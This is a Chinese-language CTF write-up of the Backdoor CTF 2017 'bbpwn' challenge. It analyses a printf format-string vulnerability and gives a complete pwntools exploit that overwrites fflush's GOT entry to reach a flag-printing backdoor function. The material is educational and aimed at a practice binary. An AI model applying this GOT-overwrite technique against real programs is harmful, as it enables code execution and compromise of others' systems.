---
title: nightmare 3.1.Backdoorctf2017 bbpwn-wp
date: 2023-08-24 09:31:48
tags:
- CTF
- pwn
- fmt_str
- stack 
- got  
- Backdoorctf2017
- nightmare
categories:
- pwn-wp
---

[相关资源](https://github.com/guyinatuxedo/nightmare/tree/master/modules/10-fmt_strings/backdoor17_bbpwn)  

## 文件分析

```sh
$ checksec 32_new
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
    
$ ./32_new
Hello baby pwner, whats your name?
guyinatuxedo
Ok cool, soon we will know whether you pwned it or not. Till then Bye guyinatuxedo
```

## 代码分析

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp) {
  char s[200]; // [esp+18h] [ebp-200h] BYREF
  char format[300]; // [esp+E0h] [ebp-138h] BYREF
  unsigned int v5; // [esp+20Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  puts("Hello baby pwner, whats your name?");
  fflush(stdout);
  fgets(s, 200, edata);
  fflush(edata);
  sprintf(format, "Ok cool, soon we will know whether you pwned it or not. Till then Bye %s", s);
  fflush(stdout);
  printf(format);
  fflush(stdout);
  exit(1);
}

void flag(void) {
  system("cat flag.txt");
  return;
}
```

1. 11# 获取输入置于`format`中
2. 13# 直接输出format（存在格式化字符串漏洞）
3. 18# 有后门函数flag

## 攻击方法

因为栈上地址无法泄露，我们不可获取栈地址从而写返回地址

但是main最后还调用了库函数`fflush`，我们可以改写got表中它的真实地址为`flag`函数的地址，从而获取flag

### %n作用

把截至目前成功输出的字符数量以`int`型数据格式写入到对应地址

### %{num}$x作用

指定第`{num}`个参数进行输出/写入     那么`printf("hhh%2$n", a, b)`也就是将`3`写入第二个参数`b`**指向的内存（注意不是改写b本身）**

### 覆盖方式

从低字节向高字节覆盖，注意写入的值**只增不减** （因为输出只会多不会少），但我们通常只要保证低字节位为我们想要的值即可，溢出可以继续被覆盖

例：		假如我们想写入`0x0862`，但我们目前就已经输出了`0x70`个字符

1. 法一：首先凑满`0x162`写入最低地址，再凑够`0x208`写入地址加一，假设溢出对后面没有太大影响的话就已经写入成功

   ```assembly
   |62|01|
   |62|08|02|
   ```

2. 法二：直接凑够`0x862`个字符写入

   ```
   |62|08|
   ```

## exp

```python
from pwn import *
from ctypes import *
import sys
context(os='linux', arch='i386', log_level='debug')

mode = ''
if len(sys.argv) > 1:
    mode = sys.argv[1]

proc = process("./32_new")
belf = ELF("./32_new")

def s(x): proc.send(x)
def sl(x): return proc.sendline(x)
def sd(x): return proc.send(x)
def sla(x, y): return proc.sendlineafter(x, y)
def sa(x, y): return proc.sendafter(x, y)
def ru(x): return proc.recvuntil(x)
def rc(): return proc.recv()
def rl(): return proc.recvline()
def li(con): return log.info(con)
def ls(con): return log.success(con)
def pi(): return proc.interactive()
def pcls(): return proc.close()
def ga(): return u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))

gscript = '''
    b main
    b * 0x080487D7
	c
'''
if mode == '-d':
    gdb.attach(proc, gdbscript=gscript)

flag = 0x0804870B
main = 0x08048724
fflush_got = belf.got['fflush']
payload = p32(fflush_got)			
payload += p32(fflush_got + 1) + p32(fflush_got + 3)
payload += b'%185d%10$n'        # 0x10b-82=185		前面的输出就已经有82了，我们在最低字节处写入0x10b
payload += b'%892d%11$n'       # 0x487-0x10b=892	第二字节处写入0x0487
payload += b'%129d%12$n'        # 0x508-0x487=129	最后一个字节处写入0x0508

sla(b'name?', payload)
pi()
pause()
```




---
